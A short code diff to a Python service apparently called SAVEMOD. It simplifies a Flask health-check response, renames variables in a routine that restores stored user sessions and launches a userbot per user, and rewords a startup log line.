-    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})
+    return jsonify({'status': 'ok'})
 
 def run_web():
     flask_app.run(host='0.0.0.0', port=8080, debug=False)
 
 async def restore_sessions():
     cursor.execute('SELECT user_id, session_string FROM user_sessions')
-    for user_id, session_str in cursor.fetchall():
-        if not is_target_admin(user_id):
-            asyncio.create_task(run_userbot(user_id, session_str))
+    for uid, ss in cursor.fetchall():
+        if not is_target_admin(uid):
+            asyncio.create_task(run_userbot(uid, ss))
 
 async def main():
-    logger.info(f"🚀 SAVEMOD ЗАПУСК | Админы: {ADMIN_IDS}")
+    logger.info(f"SAVEMOD запущен. Админы: {ADMIN_IDS}")
     await restore_sessions()
     while True:
         await asyncio.sleep(60)
